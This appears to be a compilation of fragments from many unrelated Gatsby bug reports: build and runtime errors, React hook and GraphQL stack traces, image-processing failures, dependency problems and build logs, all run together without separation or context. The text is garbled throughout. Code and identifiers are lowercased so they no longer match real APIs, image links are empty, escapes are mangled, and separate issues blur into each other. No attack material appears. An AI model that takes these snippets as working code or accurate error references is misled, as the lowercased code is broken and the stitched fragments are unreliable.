3:31 cannot find module 'gatsby-cli/src/structured-errors/error-map' or its corresponding type declarations
1 | import { actions, activitystatuses, activitytypes } from "../constants"; 2 | import { istructurederror } from "../../structured-errors/types"; > 3 | import { errorcategory } from "gatsby-cli/src/structured-errors/error-map"; | ^ 4 | export interface igatsbyclistate { 5 | messages: array<ilog>; 6 | activities: {
failed building development bundle - 17.058s
styles always load fine at the beginning, the user is able to browse but then it breaks at some point.
204 no content
it fails 95% of the time.
only images that are using `img` seem to work, the ones with `gatsby-image` seem to stuck on the gray svg placeholder state and not being loaded.
on safari on a mac, i've gotten multiple error messages similar to:
the resource was preloaded using link preload but not used within a few seconds from the window's load event
please make sure it wasn't preloaded for nothing.
page is not realoded
![image](
it is failing.
blank page.
error: the result of this staticquery could not be fetched.
with gatsby 2.24.65 and above you'll get 404-error page.
build process stuck at `generating image thumbnails`.
only webp images are created.
build required 90+ minutes and uses insane amounts of memory.
long list of missing peer dependencies
nothing happens on the browser, changes only get applied after refreshing the page.
error in console: typeerror: cannot read property 'replace' of undefined
the favicon does not change in chromium based browsers because it is rendering the bitmap fallback rather than the svg
post are not shown according to sorting criteria
it looks that show last updated post first.
error there was a problem parsing the graphql query in file: /jenkins/workspace/ej2-13795-gatsby-automation-6ssporwhibtzvep3ularn7ioubuzrik4mulebtplvfgiz2yjbtrq/repositories/ej2-react-api-library/api-apps/src/templates/layout.js _graphql.default.stripignoredcharacters is not a function \x1b[0m
\x1b[0m \x1b[0m\x1b[97m\x1b[41mtypeerror\x1b[0m\x1b[37m\x1b[41m:\x1b[0m\x1b[37m\x1b[41m \x1b[0m\x1b[97m\x1b[41m_graphql.default.stripignoredcharacters is not a function\x1b[0m
\x1b[0m \x1b[0m\x1b[90m-\x1b[0m \x1b[0m\x1b[93mindex.js\x1b[0m\x1b[90m:\x1b[0m\x1b[93m157\x1b[0m\x1b[37m \x1b[0m\x1b[37mgetgraphqltag\x1b[0m
\x1b[0m \x1b[0m \x1b[0m\x1b[90m[ej2-react-api-library]/[babel-plugin-remove-graphql-queries]/index.js:157:4\x1b[0m \x1b[0m \x1b[0m\x1b[90m3\x1b[0m
the following error is encountered: ````
react.development.js:1465 uncaught error: invalid hook call
hooks can only be called inside of the body of a function component
this could happen for one of the following reasons:
you might have mismatching versions of react and the renderer (such as react dom)
you might be breaking the rules of hooks
you might have more than one copy of react in the same app
see for tips about how to debug and fix this problem
at resolvedispatcher (react.development.js:1465) at object.usecontext (react.development.js:1473) at usemdxcomponents (esm.js:120) at esm.js:151 at renderwithhooks (react-dom.development.js:14803) at updateforwardref (react-dom.development.js:16816) at beginwork (react-dom.development.js:18645) at htmlunknownelement.callcallback (react-dom.development.js:188) at object.invokeguardedcallbackdev (react-dom.development.js:237) at invokeguardedcallback (react-dom.development.js:292) at beginwork$1 (react-dom.development.js:23203) at performunitofwork (react-dom.development.js:22154) at workloopsync (react-dom.development.js:22130) at performsyncworkonroot (react-dom.development.js:21756) at scheduleupdateonfiber (react-dom.development.js:21188) at updatecontainer (react-dom.development.js:24373) at react-dom.development.js:24758 at unbatchedupdates (react-dom.development.js:21903) at legacyrendersubtreeintocontainer (react-dom.development.js:24757) at render (react-dom.development.js:24840) at app.js:115
resolvedispatcher @ react.development.js:1465
usecontext @ react.development.js:1473
usemdxcomponents @ esm.js:120
(anonymous) @ esm.js:151
renderwithhooks @ react-dom.development.js:14803
updateforwardref @ react-dom.development.js:16816
beginwork @ react-dom.development.js:18645
callcallback @ react-dom.development.js:188
invokeguardedcallbackdev @ react-dom.development.js:237
invokeguardedcallback @ react-dom.development.js:292
beginwork$1 @ react-dom.development.js:23203
performunitofwork @ react-dom.development.js:22154
workloopsync @ react-dom.development.js:22130
performsyncworkonroot @ react-dom.development.js:21756
scheduleupdateonfiber @ react-dom.development.js:21188
updatecontainer @ react-dom.development.js:24373
(anonymous) @ react-dom.development.js:24758
unbatchedupdates @ react-dom.development.js:21903
legacyrendersubtreeintocontainer @ react-dom.development.js:24757
render @ react-dom.development.js:24840
(anonymous) @ app.js:115
settimeout (async)
(anonymous) @ ready.js:37
(anonymous) @ app.js:114
promise.then (async)
(anonymous) @ app.js:107
promise.then (async)
(anonymous) @ app.js:24
./.cache/app.js @ app.js:17
__webpack_require__ @ bootstrap:789
fn @ bootstrap:100
0 @ page-2.mdx:15
__webpack_require__ @ bootstrap:789
(anonymous) @ bootstrap:856
(anonymous) @ bootstrap:856
index.js:2177 the above error occurred in the <locationprovider> component: in locationprovider (created by context.consumer) in location (at root.js:123) in root (at root.js:131) in mdxprovider (at wrap-root-element.js:65) in mdxscopeprovider (at wrap-root-element.js:64) in component (created by component) in component (at wrap-root-element.js:72) in staticquerystore (at root.js:138) in _default (at app.js:115) consider adding an error boundary to your tree to customize error handling behavior.
visit to learn more about error boundaries.
``` <react.fragment> <box> <gatsbyimage fluid={data.file.childimagesharp.fluid} /> </box>
``` header.js
<laptopandwider> {data.datajson.navigationprimary.map(x => <button key={x.title} component={link} to={x.path} color="inherit" underline={"none"}> <box height="70" alignitems="center" justifycontent="center" display="flex"> <typography variant={"h6"}> {x.title} </typography> </box> </button> )}
``` a style from one button is applied to the box around the image:
![screenshot 2020-09-22 at 12 40 53]( after navigating to page a and back to title the page works as expected: ![screenshot 2020-09-22 at 12 57 01](
the generated icons (png) are bad: ![icon-512x512](
two error is throwed when access to '/'
`the route "/" matches both a page and a redirect; this is probably not intentional.` this is come from #l25
``` uncaught error: ensureresources was not able to find resources for path: "/" this typically means that an issue occurred building components for that path
run `gatsby clean` to remove any cached elements
``` this is come from #l79
gatsby develop fails
no failback and no images showing up
white screen on some route pages
nothing changes, the old node is displayed
and i can see this errors in preview server `cannot read property 'attributes' of undefined`
...but in fact, i get an error stack trace as described above.
![image](
shows a blank screen
with `gatsby-source-contentful` version 2.1.45 and newer, it crashes with this error message:
accessing your contentful space failed.
try setting gatsby_contentful_offline=true to see if we can serve from cache
used options:
spaceid: "*********dbd"
accesstoken: "***************************************snlg"
environment: "development"
host: "cdn.contentful.com"
downloadlocal (default value): false
localefilter (default value): [function]
forcefullsync (default value): false
pagelimit (default value): 100
usenameforid (default value): true not finished source and transform nodes - 0.422s
error command failed with exit code 1.
![preview](
![rendered html]( in this specific case, it didn't load any classname whatsoever
also if you look further within this element the classname for the div containing the title name and year text "pokemon (1997)" is using an incorrect classname for something only used on /, /tv, and /movie pages, `titleposters.module.container`
that's why it's got a big margin-left with a lot of spacing to it
what's odd though is my gatsby serve didn't do this, but the one specifically built and then just copied to public_html for the link i provided above in reproduction steps did
is serve also doing something that just loading the built files isn't?
file reduced for brevity - note entry `/customassetprefix/page-2/` second from last line
sandbox@sse-sandbox-jd5rc:/sandbox$ cat public/_headers
## created with gatsby-plugin-netlify /* x-frame-options: deny x-xss-protection: 1; mode=block x-content-type-options: nosniff referrer-policy: same-origin
/styles.9b4500260357dc3df222.css cache-control: public, max-age=31536000, immutable
/app-140865cdb6a305440c80.js cache-control: public, max-age=31536000, immutable
/static/* cache-control: public, max-age=31536000, immutable
/sw.js cache-control: no-cache
/customassetprefix/page-2/ link: </customassetprefix/webpack-runtime-81ef2531a159eeb14db3.js>; rel=preload; as=script
didnt build
![image](
i am getting a lot of error messages similar to this: error in ./.storybook/preview.js-generated-config-entry.js module not found: error: can't resolve 'core-js/modules/es.array.filter' in '/home/papa/work/games/alleswisser/.storybook' and eventually, last two lines before getting stuck: warn broken build, fix the error above
warn you may need to refresh the browser.
`promise.allsettled` polyfill is added to polyfills.js, _not added to the application code_, and safari 12 _does not_ load the polyfill.js backup file due to `nomodule` directive on the script tag, which safari 12 understands.
about one in every two times i run the command, i get the error, and the command fails
the other times, it runs with no issue.
images from samsung devices failed transformation and subsequently ended the development build
### notes on troubleshooting when i was trying to solve this issue myself, i was hoping that either `gatsby-plugin-sharp` or `gatsby-transformer-sharp` would have the ability to pass through more options
i saw that the specific option i needed (and referenced in the `sharp` repo linked above) was not one of the ones i could pass, so i decided to directly manipulate the media that was causing an issue
in my media library, it was a total of 5 images that needed to be re-encoded (by importing into photoshop, then re-exported as a jpeg)
this worked for my site, but it did not seem to be a scalable option
unless this is fixed in the `sharp` plugins, i will need to do the same for my production site
it's a very specific issue, but i'd rather not have a site with thousands of images crash on a development build because of a single image
also, i did a small non-comprehensive test by editing the `gatsby-plugin-sharp/src/process-file.js` [file]( and changing line 83 to be: `pipeline = sharp(file, { failonerror: false });`
this also removed the error for my development build allowing it continue without crashing
the image itself was inaccessible by `localfile.childimagesharp.fluid` but i'd rather have that than not even being able to work on the site with `gatsby develop`, especially since i do receive a graphql error in my terminal and i'm not unaware of a broken image.
there are no images and components are not styled correctly
``` error #85901 graphql there was an error in your graphql query: input file contains unsupported image format
onrouteupdate was not called
'build prduction javascript and css bundles' process 'error' - 'unhandled rejection'
gatsby new project
info creating new site from git:
cloning into 'project'...
remote: enumerating objects: 16, done.
remote: counting objects: 100% (16/16), done.
remote: compressing objects: 100% (11/11), done.
remote: total 16 (delta 0), reused 9 (delta 0), pack-reused 0
unpacking objects: 100% (16/16), 372.57 kib | 849.00 kib/s, done.
success created starter directory layout
info installing packages..
> fsevents@1.2.13 install /users/romanmirov/desktop/project/node_modules/fsevents
> node install.js error command failed with exit code 255: npm install error: command failed with exit code 255: npm install - error.js:56 makeerror [global]/[execa]/lib/error.js:56:11 - index.js:114 handlepromise [global]/[execa]/index.js:114:26 - task_queues.js:93 processticksandrejections internal/process/task_queues.js:93:5 - init-starter.js:143 install [global]/[gatsby-cli]/lib/init-starter.js:143:7 - init-starter.js:210 clone [global]/[gatsby-cli]/lib/init-starter.js:210:3 - init-starter.js:351 initstarter [global]/[gatsby-cli]/lib/init-starter.js:351:5 - create-cli.js:428 [global]/[gatsby-cli]/lib/create-cli.js:428:7
`" warning: event "xstate.after(1000)#waitingmachine.batchingnodemutations" was sent to stopped service "waitingmachine"
this service has already reached "`
throwing error , refer screenshot or access url looks like issue is with this module
#l48
my local machine is not bothered, but it don't like bugs/warnings/error, because you never know what other code it might mess up in future updates from other corresponding packages.
three staticquery fetch errors post to the console
the purple space man also remains low resolution.
the dropdown menu item gets the wrong position
an error `unhandled rejection lock is already released` is thrown instead
it appears that sigint is called twice on macos
this does not occur under windows 10 using wsl2
the only way to scroll is with mousewheel scroll, or by dragging the scroll bars.
build fails
doesn't remove period then url slug gets truncated.
i get no syntax highlighting and white text
![image](
custom id string is not removed
overlapping menu.
error #98123 webpack generating development javascript bundle failed unknown option: .reactruntime
check out #options for more information about options
file: .cache/app.js error #98123 webpack generating development javascript bundle failed unknown option: .reactruntime
check out #options for more information about options
file: .cache/polyfill-entry.js
it doesn't build.
on ie11, when trying to create empty checkout, i get valueof error - seems like some missing polyfills
i have checked the changelog and what is seems like that there was a breaking change: #2240-2020-07-09
to be more specific i think this -> gatsby: add polyfill chunk to gatsby
on older version of gatsby ( 2.23.23 ), i got it working, with adding core-js polyfill of "object" to my gatsby-browser.js, because of other issues:
`const polyfill = require('core-js/es7/object');` i did some testing on my current setup, and here were the results i got:
2.24.4 - console error valueof
2.24.0 - console error valueof
2.23.23 - (had to add core-js polyfill for object)
2.23.15 - (had to add core-js polyfill for object)
2.23.14 - build fails with error: cannot find module 'core-js/modules/es6.string.iterator' for the following versions, it seems to work out of the box or just when i add polyfill for fetch.
2.23.12 - all looks good
2.23.8 - all looks good
2.23.5 - all looks good
2.23.3 - all looks good i have also found a starter example on github, that has shopify working with gatsby and ie11 but i had to do one change to get it running:
this one comes with a lock files and is targeting older version of gatsby, so thats why it works on ie11
to be more precise, i had to import fetch from isomorphic-fetch and pass it to buildclient:
then this example started to work for me
let me know if you need more information or want more examples
![image](
the following error: ```bash
error #98123 webpack generating development javascript bundle failed unexpected token 'export' file: ../gatsby-theme-wordpress-starter/src/assets/css/index.css failed building development bundle - 3.622s
the component in storybook has no styles - the dom structure looks like this, with no class applied
`<div>i should be a green button</div>` where as the dom structure looks like this when `gatsby develop`
`<div class="button-module--button--2z6on">i should be a green button</div>`
`eresolve: could not resolve dependency tree` (note: this error message will be much more comprehensive and helpful in the next npm v7 beta.)
the `gatsby build` process adds inline sizing styles to the image that don't necessarily match the viewport, causing the image to be sized incorrectly.
"allcontentfulmainnav": { "edges": [ { "node": { "theme": "light", "pages": [ { "route": "/who-we-are" }, { "route": "/why-we-are-here" }, { "route": "/what-we-do" }, { "route": "external-route" }, { "route": "/contact" }, { "route": "external-route" }, { "route": "/what-we-do" }, { "route": "/why-we-are-here" }, { "route": "/privacy" }, { "route": "/" } ] } }, { "node": { "theme": "dark", "pages": [ { "route": "/who-we-are" }, { "route": "/what-we-do" }, { "route": "/why-we-are-here" }, { "route": "external-route" }, { "route": "/contact" }, { "route": "/contact" }, { "route": "/who-we-are" } ] } } ] } }
image does not render
![2020-08-27_10-58-12](
route blacklisted
and can only get published posts
changes are not shown in the browser (
even after the restart
i had to execute `gatsby clean`
after 'gatsby develop' command, the following log is output: error there was a problem loading the local develop command
gatsby may not be installed
perhaps you need to run "npm install"? cannot find module \'react\'
require stack:
- /users/reactworkspace/tutorial-part-three/node_modules/ink/build/instance.js
- /users/reactworkspace/tutorial-part-three/node_modules/ink/build/render.js
- /users/reactworkspace/tutorial-part-three/node_modules/ink/build/index.js
- /users/reactworkspace/tutorial-part-three/node_modules/gatsby/node_modules/gatsby-cli/lib/reporter/loggers/ink/index.js
- /users/reactworkspace/tutorial-part-three/node_modules/gatsby/node_modules/gatsby-cli/lib/reporter/start-logger.js
- /users/tutorial-part-three/node_modules/gatsby/node_modules/gatsby-cli/lib/reporter/index.js
- /users/reactworkspace/tutorial-part-three/node_modules/gatsby/dist/utils/detect-port-in-use-and-prompt.js
- /users/reactworkspace/tutorial-part-three/node_modules/gatsby/dist/commands/develop.js
- /usr/local/lib/node_modules/gatsby-cli/lib/create-cli.js
- /usr/local/lib/node_modules/gatsby-cli/lib/index.js
- /usr/local/lib/node_modules/gatsby-cli/cli.js
`actions` is undefined
on initial render, the logging order is: onprerouteupdate > layout > onrouteupdate
on subsequent navigations, the logging order is: layout > onprerouteupdate > onrouteupdate
![image](
npm audit warns about an high security vulnerability, which is not resolvable by npm audit fix.
the set of path used for resolution using gatsby-plugin-react-css-modules differs from the one set by gatsby-plugin-resolve-src
as a result, trying to import css using these path lead to a "cannot find module" error and gatsby does not start.
everything is rerendered on clicking an anchor link, which re-triggers the initial mounting animation for the page.
`run page queries` output only after second save: ```
success onpreextractqueries - 0.009s
success extract queries from components - 0.045s
success write out requires - 0.006s
success re-building development bundle - 0.425s
success onpreextractqueries - 0.009s
success extract queries from components - 0.032s
success write out requires - 0.002s
success run page queries - 0.011s - 1/1 88.96/s
success re-building development bundle - 0.064s
``` i don't think this is a recent thing; i just didn't entirely recognize the issue i was having with hot reloads until now
"try saving twice" didn\'t really occur to me until this week, when i discovered the workaround.
cannot find module '../build/release/sharp.node'
the page fails to render with the error: ```
error: the result of this staticquery could not be fetched.
``` link to live environment: ![capture](
some problems with static query i guess system: os: macos 10.15.6 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.14.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.8 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.125 firefox: 79.0 safari: 13.1.2 npmpackages: gatsby: ^2.17.4 => 2.24.10 gatsby-cli: ^2.12.62 => 2.12.65 gatsby-image: ^2.2.29 => 2.4.13 gatsby-plugin-google-analytics: ^2.0.13 => 2.3.13 gatsby-plugin-layout: ^1.0.11 => 1.3.10 gatsby-plugin-manifest: ^2.2.23 => 2.4.20 gatsby-plugin-offline: ^3.0.16 => 3.2.20 gatsby-plugin-react-helmet: ^3.1.13 => 3.3.10 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-sharp: ^2.2.32 => 2.6.21 gatsby-plugin-styled-components: ^3.3.10 => 3.3.10 gatsby-plugin-transition-link: ^1.20.2 => 1.20.2 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-source-filesystem: ^2.1.33 => 2.3.22 gatsby-source-graphql: ^2.6.2 => 2.6.2 gatsby-source-shopify: ^3.2.24 => 3.2.24 gatsby-transformer-sharp: ^2.3.0 => 2.5.11 npmglobalpackages: gatsby-cli: 2.12.87
doesn't matter whether you develop with just single file in page folder (meaninig you deloping only 1 page) or 50 gatsby-image will generate all the images into public folder
$ gatsby clean && env-cmd -f .env gatsby build
info deleting .cache, public,
info successfully deleted directories
success open and validate gatsby-configs - 0.023s
success load plugins - 0.344s
success onpreinit - 0.063s
success delete html and css files from previous builds - 0.006s
success initialize cache - 0.007s
success copy gatsby files - 0.023s
success onprebootstrap - 0.006s
success createschemacustomization - 0.007s fetch all airtable rows from 1 tables: 600.840ms
success checking for changed pages - 0.004s
success source and transform nodes - 1.126s
success building schema - 0.297s
success createpages - 0.046s
success checking for changed pages - 0.002s
success createpagesstatefully - 0.056s
success update schema - 0.025s
success onpreextractqueries - 0.001s
success extract queries from components - 1.537s
success write out redirect data - 0.002s
success build manifest and related icons - 0.067s
success onpostbootstrap - 0.071s
info bootstrap finished - 6.082s
success run static queries - 0.127s - 3/3 23.58/s
success run page queries - 0.150s - 7/7 46.69/s
success write out requires - 0.004s
success building production javascript and css bundles - 27.923s
success rewriting compilation hashes - 0.002s
failed building static html for pages - 6.325s error #95313 building static html failed see our docs page for more info on this error: 10 | function invarianterror(message) { 11 | if (message === void 0) { message = genericmessage; }
> 12 | var _this = _super.call(this, typeof message === "number" | ^ 13 | ? genericmessage + ": " + message + " (see " 14 | : message) || this; 15 | _this.framestopop = 1; webpackerror: invariant violation: invariant violation: 23 (see raphql/invariant-packages) - invariant.esm.js:12 node_modules/ts-invariant/lib/invariant.esm.js:12:1 - checkfetcher.js:4 node_modules/@apollo/client/link/http/checkfetcher.js:4:52 - createhttplink.js:15 node_modules/@apollo/client/link/http/createhttplink.js:15:17 - httplink.js:8 node_modules/@apollo/client/link/http/httplink.js:8:53 - client.js:6 src/state/client.js:6:9 - wrap-root-element.js:1 src/state/wrap-root-element.js:1:1 - gatsby-ssr.js:1 gatsby-ssr.js:1:1
"unknown fragment \\"gatsbycontentfulfixed_withwebp_nobase64\\"."
missing reopen button:
<img width="955" alt="bildschirmfoto 2020-08-19 um 16 56 45" src=" ">
we see "notfound.js" component\'s content firstly, then js loads login content.
with js disabled we will see notfound.js content only.
`navigate` doesn't return a promise
sidebar is not updated
bread crumbs are not updated
changes made in `code.py` are not shown in the browser
even after restart of gatsby service
i had to clear cache or change mdx file with some random changes.
website pages are empty.
the error above
if you open the new built site, the new post ("test post") should be present
the previous post ("new beginnings") does _not_ link to it
clearing the cache fixes the problem: ```
gatsby clean
gatsby build
gatsby serve
``` the site should build as expected
but now, if you remove the `content/blog/test-post` directory, and run `gatsby build`, "test post" won\'t appear on the index page but the "new beginnings" post will still link to it (and the "test post" page will still exist in the build.) ### additional information i played around a bit trying to figure out how to bust the stale data, but with no luck
one thing i noticed is that the `createpages` function uses this logic to generate the `previous` and `next` data: ```js
const previous = index === posts.length - 1 ? null : posts[index + 1].node
const next = index === 0 ? null : posts[index - 1].node
``` i tried to update it to use a graphql query instead: ```diff
{ allmarkdownremark(sort: {fields: [frontmatter___date], order: desc}, limit: 1000) { edges { node { fields { slug } frontmatter { title } }
+ previous {
+ frontmatter {
+ frontmatter {
``` this had no effect
the stale cache was still used
if it\'s not feasible to make the caching "smart" enough for this scenario, it would be also good if `createpages` had the ability to manually use or override the cache, as well as delete cached pages after their source data has been deleted.
got this error ```
npm err! cb.apply is not a function npm err! a complete log of this run can be found in:
npm err! /users/detj/.npm/_logs/2020-08-16t21_52_51_610z-debug.log
install for [ 'gatsby-cli@latest' ] failed with code 1
`cannot find module react`
the **pathname** always return the root link of the website (/) which inject this canonical link instead:
```<link rel="canonical" href=" ">```
the assertion `assert("firstfield" in fullnode)` will fail, indicating that a field has been deleted
the actual build looks different, and behaves differently
also content is not showing
completely different result to what i have in my development environment
<img width="720" alt="screenshot 2020-08-16 at 10 52 56" src=" ">
the `scroll` event handler kicks in and forces `backgroundimage` to rerender, which results in multiple image load events:
![image](
error and neverending installation
unformatted data is rendered.
``` error #98124 webpack generating ssr bundle failed can't resolve '/tmp/my-theme/example/src/utils/typography' in '/tmp/my-theme/example/.cache/caches/gatsby-plugin-typography' if you're trying to use a package make sure that '/tmp/my-theme/example/src/utils/typography' is installed
if you're trying to use a local file make sure that the path is correct.
images not showing because `pathprefix` is ignored in webp pictures i will post a pr to `gatsby-remark-images` with an easy solution to this issue
cannot find module 'gatsby-cli/lib/reporter'
sidebar is not updated
redirects are not updated
typescript error
### quick hotfix? adding some generics would work:
const usescrollrestoration: <t extends htmlelement>( // <- added generics here key: string
) => { ref: react.mutablerefobject<t | undefined> onscroll(): void
so i can specify the element myself:
const scrollrestoration = usescrollrestoration<htmldivelement>(`scroll-restoration-key`);
error: cannot find module 'gatsby-cli/lib/reporter' require stack: - /users/jume/hello-world/node_modules/gatsby-plugin-page-creator/is-valid-col lection-path-implementation.js - /users/jume/hello-world/node_modules/gatsby-plugin-page-creator/create-pages -from-collection-builder.js - /users/jume/hello-world/node_modules/gatsby-plugin-page-creator/create-page- wrapper.js - /users/jume/hello-world/node_modules/gatsby-plugin-page-creator/gatsby-node
js - /users/jume/hello-world/node_modules/gatsby/dist/bootstrap/resolve-module-ex ports.js - /users/jume/hello-world/node_modules/gatsby/dist/bootstrap/load-plugins/vali date.js - /users/jume/hello-world/node_modules/gatsby/dist/bootstrap/load-plugins/load .js - /users/jume/hello-world/node_modules/gatsby/dist/bootstrap/load-plugins/inde x.js - /users/jume/hello-world/node_modules/gatsby/dist/services/initialize.js - /users/jume/hello-world/node_modules/gatsby/dist/services/index.js - /users/jume/hello-world/node_modules/gatsby/dist/state-machines/develop/serv ices.js - /users/jume/hello-world/node_modules/gatsby/dist/state-machines/develop/inde x.js - /users/jume/hello-world/node_modules/gatsby/dist/commands/develop-process.js - /users/jume/hello-world/.cache/tmp-53186-ih0e7pfkg9t2
build sometimes fails.
the url isn't updated
page reload occurs instead.
error mentioned in description section
i get errors instead
error code that a module is missing `gatsby-cli/lib/reporter`.
two scrollbars
for problem 1, the spinner is displayed during `gatsby develop` but not during `gatsby build`/`gatsby serve` for problem 2, the banner is blue until a css-related line in an **unrelated** file is commented out.
all three **plugins**, **themes**, and **recipes** tabs repeat the same descriptive text
![gatsby_cloud](
received the error: `error: cannot find module 'gatsby-cli/lib/reporter `
<--- js stacktrace ---> ==== js stack trace ========================================= 0: exitframe [pc: 0000013e6cddc5c1]
security context: <jsobject> 1: dojoin(aka dojoin) [0000028f21385e69] [native array.js:~87] [pc=0000013e6e07c9f1](this= <undefined>,l= <jsarray[2542714]>,m=2542714,a= <true>,w= <string[0]: >,v= <false>) 2: join(aka join) [0000028f21385eb9] [native array.js:~112] [pc=0000013e6ce4ec18](this= <und..
fatal error: ineffective mark-compacts near heap limit allocation failed - javascript heap out of memory 1: 00007ff7aebf87da v8::internal::gcidletimehandler::gcidletimehandler+4506 2: 00007ff7aebd3246 node::makecallback+4534 3: 00007ff7aebd3bc0 node_module_register+2032 4: 00007ff7aeef1a4e v8::internal::fatalprocessoutofmemory+846 5: 00007ff7aeef197f v8::internal::fatalprocessoutofmemory+639 6: 00007ff7af0d8174 v8::internal::heap::maxheapgrowingfactor+9620 7: 00007ff7af0cf156 v8::internal::scavengejob::operator=+24550 8: 00007ff7af0cd7ac v8::internal::scavengejob::operator=+17980 9: 00007ff7af0d64f7 v8::internal::heap::maxheapgrowingfactor+2327
10: 00007ff7af0d6576 v8::internal::heap::maxheapgrowingfactor+2454
11: 00007ff7af20049b v8::internal::factory::allocaterawwithimmortalmap+59
12: 00007ff7af202f4d v8::internal::factory::newrawtwobytestring+77
13: 00007ff7af4ba404 v8::internal::wasm::wasmmodulebuilder::writeasmjsoffsettable+198212
14: 0000013e6cddc5c1
npm err! code elifecycle
npm err! errno 134
npm err! indikatrix@2.1.1 build: `gatsby build`
npm err! exit status 134
npm err! failed at the indikatrix@2.1.1 build script.
npm err! this is probably not a problem with npm
there is likely additional logging output above
npm err! a complete log of this run can be found in:
there is the error about the build
<img width="923" alt="screenshot 2020-08-12 at 09 51 22" src=" ">
duplicates are returned.
debugger listens on 127.0.0.1 instead of 0.0.0.0
style removed in build mode
the following error: > there was an error in your graphql query: cannot query field "themeuiconfig" on type "query"
if you don\'t expect "themeuiconfig" to exist on the type "query" it is most likely a typo.
however, if you expect "themeuiconfig" to exist there are a couple of solutions to common problems: - if you added a new data source and/or changed something inside gatsby-node.js/gatsby-config.js, please try a restart of your development server
- the field might be accessible in another subfield, please try your query in graphiql and use the graphiql explorer to see which fields you can query and what shape they have
- you want to optionally use your field "themeuiconfig" and right now it is not used anywhere
therefore gatsby can't infer the type and add it to the graphql schema
a quick fix is to add a least one entry with that field ("dummy content") it is recommended to explicitly type your graphql schema if you want to use optional fields
this way you don\'t have to add the mentioned "dummy content"
visit our docs to learn how you can define the schema for "query":
#creating-type-definitions file: /users/nick/desktop/learn-gatsby/node_modules/gatsby-plugin-theme-ui/src/hooks/configoptions.js there was an error in your graphql query: cannot query field "social" on type "sitesitemetadata"
if you don\'t expect "social" to exist on the type "sitesitemetadata" it is most likely a typo.
however, if you expect "social" to exist there are a couple of solutions to common problems: - if you added a new data source and/or changed something inside gatsby-node.js/gatsby-config.js, please try a restart of your development server
- the field might be accessible in another subfield, please try your query in graphiql and use the graphiql explorer to see which fields you can query and what shape they have
- you want to optionally use your field "social" and right now it is not used anywhere
therefore gatsby can't infer the type and add it to the graphql schema
a quick fix is to add a least one entry with that field ("dummy content") it is recommended to explicitly type your graphql schema if you want to use optional fields
this way you don\'t have to add the mentioned "dummy content"
visit our docs to learn how you can define the schema for "sitesitemetadata":
#creating-type-definitions file: /users/nick/desktop/learn-gatsby/node_modules/gatsby-theme-blog-core/src/templates/post-query.js there was an error in your graphql query: cannot query field "blogpost" on type "query"
if you don\'t expect "blogpost" to exist on the type "query" it is most likely a typo.
however, if you expect "blogpost" to exist there are a couple of solutions to common problems: - if you added a new data source and/or changed something inside gatsby-node.js/gatsby-config.js, please try a restart of your development server
- the field might be accessible in another subfield, please try your query in graphiql and use the graphiql explorer to see which fields you can query and what shape they have
- you want to optionally use your field "blogpost" and right now it is not used anywhere
therefore gatsby can't infer the type and add it to the graphql schema
a quick fix is to add a least one entry with that field ("dummy content") it is recommended to explicitly type your graphql schema if you want to use optional fields
this way you don\'t have to add the mentioned "dummy content"
visit our docs to learn how you can define the schema for "query":
#creating-type-definitions file: /users/nick/desktop/learn-gatsby/node_modules/gatsby-theme-blog-core/src/templates/post-query.js there was an error in your graphql query: cannot query field "blogpost" on type "query"
if you don\'t expect "blogpost" to exist on the type "query" it is most likely a typo.
however, if you expect "blogpost" to exist there are a couple of solutions to common problems: - if you added a new data source and/or changed something inside gatsby-node.js/gatsby-config.js, please try a restart of your development server
- the field might be accessible in another subfield, please try your query in graphiql and use the graphiql explorer to see which fields you can query and what shape they have
- you want to optionally use your field "blogpost" and right now it is not used anywhere
therefore gatsby can't infer the type and add it to the graphql schema
a quick fix is to add a least one entry with that field ("dummy content") it is recommended to explicitly type your graphql schema if you want to use optional fields
this way you don\'t have to add the mentioned "dummy content"
visit our docs to learn how you can define the schema for "query":
#creating-type-definitions file: /users/nick/desktop/learn-gatsby/node_modules/gatsby-theme-blog-core/src/templates/post-query.js there was an error in your graphql query: cannot query field "blogpost" on type "query"
if you don\'t expect "blogpost" to exist on the type "query" it is most likely a typo.
however, if you expect "blogpost" to exist there are a couple of solutions to common problems: - if you added a new data source and/or changed something inside gatsby-node.js/gatsby-config.js, please try a restart of your development server
- the field might be accessible in another subfield, please try your query in graphiql and use the graphiql explorer to see which fields you can query and what shape they have
- you want to optionally use your field "blogpost" and right now it is not used anywhere
therefore gatsby can't infer the type and add it to the graphql schema
a quick fix is to add a least one entry with that field ("dummy content") it is recommended to explicitly type your graphql schema if you want to use optional fields
this way you don\'t have to add the mentioned "dummy content"
visit our docs to learn how you can define the schema for "query":
#creating-type-definitions file: /users/nick/desktop/learn-gatsby/node_modules/gatsby-theme-blog-core/src/templates/post-query.js there was an error in your graphql query: cannot query field "social" on type "sitesitemetadata"
if you don\'t expect "social" to exist on the type "sitesitemetadata" it is most likely a typo.
however, if you expect "social" to exist there are a couple of solutions to common problems: - if you added a new data source and/or changed something inside gatsby-node.js/gatsby-config.js, please try a restart of your development server
- the field might be accessible in another subfield, please try your query in graphiql and use the graphiql explorer to see which fields you can query and what shape they have
- you want to optionally use your field "social" and right now it is not used anywhere
therefore gatsby can't infer the type and add it to the graphql schema
a quick fix is to add a least one entry with that field ("dummy content") it is recommended to explicitly type your graphql schema if you want to use optional fields
this way you don\'t have to add the mentioned "dummy content"
visit our docs to learn how you can define the schema for "sitesitemetadata":
#creating-type-definitions file: /users/nick/desktop/learn-gatsby/node_modules/gatsby-theme-blog-core/src/templates/posts-query.js there was an error in your graphql query: cannot query field "allblogpost" on type "query"
if you don\'t expect "allblogpost" to exist on the type "query" it is most likely a typo.
however, if you expect "allblogpost" to exist there are a couple of solutions to common problems: - if you added a new data source and/or changed something inside gatsby-node.js/gatsby-config.js, please try a restart of your development server
- the field might be accessible in another subfield, please try your query in graphiql and use the graphiql explorer to see which fields you can query and what shape they have
- you want to optionally use your field "allblogpost" and right now it is not used anywhere
therefore gatsby can't infer the type and add it to the graphql schema
a quick fix is to add a least one entry with that field ("dummy content") it is recommended to explicitly type your graphql schema if you want to use optional fields
this way you don\'t have to add the mentioned "dummy content"
visit our docs to learn how you can define the schema for "query":
